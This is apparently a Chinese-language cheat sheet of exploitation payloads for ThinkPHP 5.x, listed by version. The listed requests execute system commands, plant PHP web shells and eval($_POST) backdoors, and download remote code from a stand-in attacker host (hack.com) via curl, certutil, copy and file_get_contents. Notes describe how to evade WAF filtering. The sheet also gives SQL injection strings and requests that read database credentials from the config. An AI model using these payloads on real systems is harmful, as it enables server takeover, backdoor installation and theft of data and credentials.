## thinkphp5.x任意代码执行

#### thinkphp 5.1.18
	http://www.xxxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]=<?=file_put_contents('index_bak2.php',file_get_contents('https://www.hack.com/xxx.js'));?>

	所有目录都无写权限,base64函数被拦截
	http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1])

	windows
	http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1
	
	http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo()

	使用certutil
	http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php
	由于根目录没写权限，所以写到uploads

#### thinkphp 5

	http://127.0.0.1/tp5/public/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1

#### thinkphp 5.0.21
	http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

	http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

#### thinkphp 5.0.22
	1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username

	2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password

	3、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

	4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

	5、/thinkphp/public/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%31%32%33

#### thinkphp 5.0.23（完整版）debug模式
	(post)public/index.php
	(data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx


#### thinkphp 5.0.23(完整版)
	post）public/index.php?s=captcha 
	(data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al

#### thinkphp 5.0.11
	http//www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.php

#### thinkphp 5.0.14
	eval（''）和assert（''）被拦截，命令函数被禁止
	http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo();

	http://www.xxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_GET[1])&1=call_user_func_array("file_put_contents",array("3.php",file_get_contents("https://www.hack.com/xxx.js")));


	php7.2
	http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=1.txt&vars[1][1]=1

	http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]=<?=file_put_contents('index111.php',file_get_contents('https://www.hack.com/xxx.js'));?>
	写进去发现转义了尖括号

	通过copy函数
	http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][0]= https://www.hack.com/xxx.js&vars[1][1]=112233.php

#### thinkphp 5.0.10
	#验证码
	(post)  /?=admin/Login/verify
	(data)  _method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo

#### 完整版
	(post)  public/index.php?s=index/index/index
	(data)  s=whoami&_method=__construct&method&filter[]=system

#### thinkphp 5.0.5
	waf对eval进行了拦截，禁止了assert函数，对eval函数后面的括号进行了正则过滤
对file_get_contents函数后面的括号进行了正则过滤。

	http://www.xxxx.com/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=2.php&vars[1][1]=<?php /*1111*//***/file_put_contents/*1**/(/***/'index11.php'/**/,file_get_contents(/**/'https://www.hack.com/xxx.js'))/**/;/**/?>

#### thinkphp 5.0.* 5.1.* 5.2.*
	(post)public/index.php
	(data)c=exec&f=calc.exe&_method=filter

#### thinkphp 5.1.*
	http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1

	http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd

	http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E

	http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E

	http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

	http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd

	http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

	http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd

#### 未知版本
	16、?s=index/\think\module/action/param1/${@phpinfo()}

	17、?s=index/\think\Module/Action/Param/${@phpinfo()}

	18、?s=index/\think/module/aciton/param1/${@print(THINK_VERSION)}

	19、index.php?s=/home/article/view_recent/name/1' 
	header = "X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233))))#"

	20、index.php?s=/home/shopcart/getPricetotal/tag/1%27

	21、index.php?s=/home/shopcart/getpriceNum/id/1%27

	22、index.php?s=/home/user/cut/id/1%27

	23、index.php?s=/home/service/index/id/1%27

	24、index.php?s=/home/pay/chongzhi/orderid/1%27

	25、index.php?s=/home/pay/index/orderid/1%27

	26、index.php?s=/home/order/complete/id/1%27

	27、index.php?s=/home/order/complete/id/1%27

	28、index.php?s=/home/order/detail/id/1%27

	29、index.php?s=/home/order/cancel/id/1%27

	30、index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+

	31、POST /index.php?s=/home/user/checkcode/ HTTP/1.1
	Content-Disposition: form-data; name="couponid"
	1') union select sleep('''+str(sleep_time)+''')#





